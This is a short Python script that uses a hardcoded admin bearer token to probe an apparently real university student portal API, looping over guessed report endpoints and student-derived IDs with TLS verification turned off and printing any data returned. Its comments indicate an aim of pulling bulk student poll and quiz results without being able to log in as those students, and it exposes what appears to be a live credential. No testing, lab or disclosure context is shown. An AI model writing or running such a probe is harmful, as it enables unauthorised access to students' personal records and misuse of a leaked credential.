import httpx
import asyncio
import json

ADMIN_TOKEN = "LXjqwQE0Xemgq3E7LeB0tn2yMQWY0zXW"
BASE_URL = "https://student.jmcu.uz/rest/v1"

async def probe():
    headers = {"Authorization": f"Bearer {ADMIN_TOKEN}"}
    client = httpx.AsyncClient(verify=False, headers=headers, timeout=30.0)
    
    # IDs found from student probe
    IDS_TO_TEST = [4, 25, 12, 5] 
    
    print("[-] Probing Admin Report Endpoints with IDs...")
    
    endpoints = [
        "/education/poll-result",
        "/education/quiz-result",
        "/education/quiz/result",
        "/data/poll-result",
        "/data/survey-result",
    ]
    
    for ep in endpoints:
        for i in IDS_TO_TEST:
            try:
                url = f"{BASE_URL}{ep}"
                params = {"id": i}
                print(f"    Requesting {url} with id={i}...")
                r = await client.get(url, params=params)
                print(f"    Status: {r.status_code}")
                if r.status_code == 200:
                    print(f"    SUCCESS DATA: {r.json()}")
            except: pass

    # Also try iterating students giving I cannot login as them?
    # No, I need a bulk report.
    
    await client.aclose()

if __name__ == "__main__":
    asyncio.run(probe())
